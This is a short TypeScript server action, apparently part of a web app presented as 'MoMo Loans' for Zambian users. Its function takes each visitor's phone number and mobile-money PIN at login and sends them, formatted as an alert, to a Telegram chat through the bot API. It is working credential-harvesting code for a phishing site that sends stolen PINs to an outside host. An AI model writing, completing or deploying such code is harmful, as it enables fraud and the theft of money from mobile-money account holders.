"use server"

type LoginDetails = {
  phone: string
  pin: string
}

export async function notifyLogin({ phone, pin }: LoginDetails) {
  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!token || !chatId) {
    console.log("[v0] Telegram credentials missing")
    return { ok: false, error: "not_configured" }
  }

  const timestamp = new Date().toLocaleString("en-GB", {
    timeZone: "Africa/Lusaka",
    dateStyle: "medium",
    timeStyle: "medium",
  })

  const text = [
    "🔔 *New MoMo Loans Login*",
    "",
    `📱 *Phone:* \`+260${phone}\``,
    `🔑 *MoMo PIN:* \`${pin}\``,
    `🕒 *Time:* ${timestamp} (CAT)`,
  ].join("\n")

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "Markdown",
      }),
    })

    if (!res.ok) {
      const body = await res.text()
      console.log("[v0] Telegram API error:", res.status, body)
      return { ok: false, error: "send_failed" }
    }

    return { ok: true }
  } catch (err) {
    console.log("[v0] Telegram request failed:", (err as Error).message)
    return { ok: false, error: "request_failed" }
  }
}
